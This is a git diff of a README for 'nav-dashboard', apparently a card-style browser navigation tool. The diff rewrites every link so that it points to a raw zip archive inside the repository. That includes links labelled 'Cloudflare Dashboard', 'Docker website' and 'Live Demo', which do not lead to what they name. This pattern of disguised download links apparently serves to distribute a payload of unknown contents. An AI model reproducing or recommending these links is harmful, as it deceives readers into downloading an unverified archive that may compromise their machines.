@@ -1,6 +1,6 @@
 # 🚀 nav-dashboard - A Modern Navigation Tool for Your Browser
 
-[![Download Now](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip%20Now-Get%20nav-dashboard-blue)](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip)
+[![Download Now](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip%20Now-Get%20nav-dashboard-blue)](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip)
 
 ## 🔗 What is nav-dashboard?
 
@@ -43,7 +43,7 @@ nav-dashboard is a modern navigation site built with a card-style layout. It use
 
 To get started with nav-dashboard, visit the Releases page to download the latest version:
 
-[Download nav-dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip)
+[Download nav-dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip)
 
 ### ☁️ Deployment Options
 
@@ -57,7 +57,7 @@ Click the “Fork” button in the upper right corner to copy the repository to 
 
 ##### Step 2: Create Cloudflare Resources
 
-Log into the [Cloudflare Dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip) and follow these steps:
+Log into the [Cloudflare Dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip) and follow these steps:
 
 1. **Create D1 Database**
    - Navigate to Workers & Pages → D1.
@@ -76,7 +76,7 @@ Log into the [Cloudflare Dashboard](https://github.com/Lawbringer90/nav-dashboar
 If you prefer using Docker, follow these steps:
 
 1. **Install Docker**
-   - Make sure you have Docker installed on your computer. You can download it from the [Docker website](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip).
+   - Make sure you have Docker installed on your computer. You can download it from the [Docker website](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip).
 
 2. **Pull the Docker Image**
    - Open a terminal window and run:
@@ -110,10 +110,10 @@ If you prefer using Docker, follow these steps:
 
 ### 🌐 Live Demo
 
-Want to see nav-dashboard in action? Check out our online demo here: [Live Demo](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip)
+Want to see nav-dashboard in action? Check out our online demo here: [Live Demo](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip)
 
 ## 🌠 Need Help?
 
 If you have any questions or need support, feel free to reach out by opening an issue in this repository or checking the documentation available on GitHub. 
 
-[Download nav-dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/public/images/dashboard-nav-v1.1-beta.5.zip) and enjoy a better way to manage your links!
+[Download nav-dashboard](https://github.com/Lawbringer90/nav-dashboard/raw/refs/heads/main/docker/server/nav_dashboard_v1.7-alpha.4.zip) and enjoy a better way to manage your links!
